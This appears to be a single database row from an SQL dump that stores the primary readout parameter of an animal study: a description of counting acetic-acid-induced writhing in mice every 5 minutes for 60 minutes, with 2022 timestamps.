	(9630,263,'primary_readout_parameter','\"After injecting acetic acid intraperitoneally, writhing in mice can be seen in a relatively short time. The writhing is calculated when the mouse moves on its hind legs stretched to the back followed by an emphasis stomach to the floor. These writhings were observed, counted, and recorded every 5 minutes for 60 minutes.\"','2022-03-31 13:24:03','2022-03-31 13:24:03'),
